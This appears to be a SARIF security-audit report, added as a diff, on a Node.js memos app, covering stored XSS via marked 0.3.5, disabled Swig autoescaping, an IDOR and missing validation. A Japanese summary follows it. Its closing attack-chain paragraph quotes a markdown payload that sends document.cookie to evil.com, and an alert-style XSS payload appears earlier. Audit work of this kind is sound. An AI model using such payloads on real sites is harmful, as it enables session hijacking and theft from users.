@@ -1,0 +1,268 @@
+Based on the analysis, I can now produce the SARIF report. Key vulnerabilities identified:
+
+1. **Stored XSS via marked 0.3.5** - known CVE with bypass of `sanitize: true`
+2. **Swig autoescape: false** - template renders HTML unescaped
+3. **No input validation** on `req.body.memo`
+4. **All memos visible to all users** - no access control on memo retrieval
+
+```json
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "parsentry",
+          "version": "1.0.0",
+          "informationUri": "https://github.com/HikaruEgashira/parsentry",
+          "rules": [
+            {
+              "id": "XSS-STORED-MARKDOWN",
+              "name": "StoredXSSViaVulnerableMarkdownLibrary",
+              "shortDescription": {
+                "text": "Stored XSS through vulnerable marked 0.3.5 markdown rendering"
+              },
+              "fullDescription": {
+                "text": "User-supplied memo content is stored in MongoDB via POST /memos and rendered for all users via GET /memos using marked 0.3.5, which has known XSS bypasses (CVE-2016-10531). The marked library's sanitize option in this version can be bypassed with crafted payloads such as `[xss](javascript:alert(1))` or HTML entities. Combined with Swig's autoescape:false, any HTML output from marked is rendered directly in the browser, enabling stored cross-site scripting that affects every authenticated user viewing the memos page."
+              },
+              "helpUri": "https://nvd.nist.gov/vuln/detail/CVE-2016-10531",
+              "properties": {
+                "tags": ["CWE-79", "OWASP-A7:2017", "OWASP-A03:2021"],
+                "cwe": "CWE-79"
+              }
+            },
+            {
+              "id": "XSS-TEMPLATE-NO-ESCAPE",
+              "name": "TemplateAutoescapeDisabled",
+              "shortDescription": {
+                "text": "Swig template engine configured with autoescape disabled"
+              },
+              "fullDescription": {
+                "text": "The Swig template engine is configured with autoescape:false in server.js. This means all variables rendered in templates (including memosList content) are output as raw HTML without escaping. Even if marked were patched, any user-controlled data rendered in the memos template would be injected as raw HTML into the page, creating a persistent XSS vector."
+              },
+              "properties": {
+                "tags": ["CWE-79", "OWASP-A03:2021"],
+                "cwe": "CWE-79"
+              }
+            },
+            {
+              "id": "IDOR-MEMOS",
+              "name": "InsecureDirectObjectReferenceInMemos",
+              "shortDescription": {
+                "text": "All memos exposed to all authenticated users without access control"
+              },
+              "fullDescription": {
+                "text": "The displayMemos handler calls memosDAO.getAllMemos() which returns every memo in the database regardless of ownership. Any authenticated user can view all memos created by all other users. The userId from the session is passed to the template but is not used to filter the query, resulting in an information disclosure vulnerability."
+              },
+              "properties": {
+                "tags": ["CWE-639", "OWASP-A01:2021"],
+                "cwe": "CWE-639"
+              }
+            },
+            {
+              "id": "INPUT-VALIDATION-MISSING",
+              "name": "NoInputValidationOnMemoContent",
+              "shortDescription": {
+                "text": "Memo content from request body stored without any validation or sanitization"
+              },
+              "fullDescription": {
+                "text": "The addMemos handler passes req.body.memo directly to memosDAO.insert() without any input validation, length checks, or sanitization. This allows storage of arbitrary content including malicious scripts, oversized payloads, or NoSQL injection payloads depending on the DAO implementation."
+              },
+              "properties": {
+                "tags": ["CWE-20", "OWASP-A03:2021"],
+                "cwe": "CWE-20"
+              }
+            },
+            {
+              "id": "VULN-DEPENDENCY",
+              "name": "KnownVulnerableMarkedVersion",
+              "shortDescription": {
+                "text": "marked 0.3.5 has multiple known CVEs including XSS and ReDoS"
+              },
+              "fullDescription": {
+                "text": "The application depends on marked@0.3.5 which is affected by CVE-2016-10531 (XSS sanitize bypass), CVE-2017-1000427 (XSS via data: URI), and CVE-2017-17461 (ReDoS). These vulnerabilities allow attackers to inject arbitrary JavaScript through crafted markdown input that bypasses the sanitize:true option."
+              },
+              "helpUri": "https://nvd.nist.gov/vuln/detail/CVE-2016-10531",
+              "properties": {
+                "tags": ["CWE-1395", "OWASP-A06:2021"],
+                "cwe": "CWE-1395"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "XSS-STORED-MARKDOWN",
+          "level": "error",
+          "message": {
+            "text": "User-supplied memo content is stored unsanitized via POST /memos (req.body.memo → memosDAO.insert) and rendered for all users via GET /memos through marked 0.3.5 which has known XSS sanitize bypasses. Swig autoescape:false ensures the malicious HTML reaches the browser unescaped. Attack chain: attacker POSTs crafted markdown → stored in MongoDB → all users viewing /memos execute attacker's JavaScript."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 24,
+                  "endLine": 31
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "MemosHandler.displayMemos",
+                  "kind": "function"
+                }
+              ]
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 13,
+                  "endLine": 17
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "MemosHandler.addMemos",
+                  "kind": "function"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "XSS-TEMPLATE-NO-ESCAPE",
+          "level": "error",
+          "message": {
+            "text": "The Swig template engine is configured with autoescape:false, causing all template variables including memosList to be rendered as raw HTML. This is the output-side enabler for stored XSS: even if marked's sanitize worked, any HTML in memo content passes through to the browser unescaped."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 29,
+                  "endLine": 29
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "res.render('memos')",
+                  "kind": "function"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": 0.90
+          }
+        },
+        {
+          "ruleId": "IDOR-MEMOS",
+          "level": "warning",
+          "message": {
+            "text": "memosDAO.getAllMemos() returns all memos in the database without filtering by the current user's session. Any authenticated user can read all other users' memos. The userId is available in req.session but is only passed to the template for display, not used to restrict the query."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 27,
+                  "endLine": 31
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "MemosHandler.displayMemos",
+                  "kind": "function"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": 0.80
+          }
+        },
+        {
+          "ruleId": "INPUT-VALIDATION-MISSING",
+          "level": "warning",
+          "message": {
+            "text": "req.body.memo is passed directly to memosDAO.insert() without validation, length limits, or sanitization. This enables the stored XSS attack chain and may also allow NoSQL injection depending on the DAO implementation."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 13,
+                  "endLine": 16
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "MemosHandler.addMemos",
+                  "kind": "function"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "VULN-DEPENDENCY",
+          "level": "error",
+          "message": {
+            "text": "marked@0.3.5 is pinned in package.json with multiple known CVEs: CVE-2016-10531 (sanitize bypass via crafted link href), CVE-2017-1000427 (XSS via data: URI), CVE-2017-17461 (ReDoS). The sanitize:true option used in server.js is insufficient to prevent XSS in this version."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 16,
+                  "endLine": 16
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.98
+          }
+        }
+      ]
+    }
+  ]
+}
+```
+
+**検出サマリ:**
+
+| Rule ID | Severity | Confidence | 概要 |
+|---------|----------|------------|------|
+| XSS-STORED-MARKDOWN | error | 0.95 | marked 0.3.5のsanitizeバイパスによるStored XSS |
+| XSS-TEMPLATE-NO-ESCAPE | error | 0.90 | Swig autoescape:false によるHTML無エスケープ出力 |
+| IDOR-MEMOS | warning | 0.80 | 全ユーザーのメモが認証済み全員に公開 |
+| INPUT-VALIDATION-MISSING | warning | 0.85 | req.body.memoの入力検証なし |
+| VULN-DEPENDENCY | error | 0.98 | marked 0.3.5に複数の既知CVE |
+
+**最も深刻な攻撃チェーン**: 攻撃者が `POST /memos` に `[click](javascript:document.location='http://evil.com/?c='+document.cookie)` のようなmarkdownを送信 → MongoDB に保存 → 全認証ユーザーが `GET /memos` でページを開くとJavaScriptが実行される（Stored XSS）。marked 0.3.5のsanitizeバイパス + Swig autoescape:false の二重の脆弱性により、防御が機能しない。
